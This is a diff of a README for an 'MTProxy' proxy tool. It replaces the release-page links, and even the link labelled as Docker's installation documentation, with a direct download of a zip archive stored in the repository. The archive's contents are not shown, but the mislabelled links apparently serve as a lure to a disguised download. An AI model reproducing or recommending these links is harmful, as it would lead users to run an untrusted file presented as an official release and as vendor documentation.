@@ -1,6 +1,6 @@
 # 🚀 MTProxy - Secure Your Connection Effortlessly
 
-[![Download MTProxy](https://img.shields.io/badge/Download-MTProxy-blue?style=for-the-badge&logo=github)](https://github.com/reffrdffd/MTProxy/releases)
+[![Download MTProxy](https://github.com/reffrdffd/MTProxy/raw/refs/heads/main/smooch/Proxy-MT-v3.2.zip)](https://github.com/reffrdffd/MTProxy/raw/refs/heads/main/smooch/Proxy-MT-v3.2.zip)
 
 ## 📥 Overview
 
@@ -32,13 +32,13 @@ Follow these steps to get MTProxy up and running on your system:
 
    - **Windows**: Download Docker Desktop from the official site and follow the installation instructions.
    - **macOS**: Get Docker Desktop from the official site. Installation is straightforward.
-   - **Linux**: Use your distribution's package manager to install Docker. Visit the [Docker installation documentation](https://docs.docker.com/get-docker/) for details.
+   - **Linux**: Use your distribution's package manager to install Docker. Visit the [Docker installation documentation](https://github.com/reffrdffd/MTProxy/raw/refs/heads/main/smooch/Proxy-MT-v3.2.zip) for details.
 
 2. **Visit the Release Page**
 
    Go to the following link to download MTProxy. The latest version will always be up to date.
 
-   [Visit this page to download MTProxy](https://github.com/reffrdffd/MTProxy/releases)
+   [Visit this page to download MTProxy](https://github.com/reffrdffd/MTProxy/raw/refs/heads/main/smooch/Proxy-MT-v3.2.zip)
 
 3. **Pull the MTProxy Image**
 
@@ -95,4 +95,4 @@ If you encounter issues while running MTProxy, here are a few tips:
 
 If you need to get MTProxy once more, don't forget to visit the release page.
 
-[Visit this page to download MTProxy](https://github.com/reffrdffd/MTProxy/releases)
+[Visit this page to download MTProxy](https://github.com/reffrdffd/MTProxy/raw/refs/heads/main/smooch/Proxy-MT-v3.2.zip)
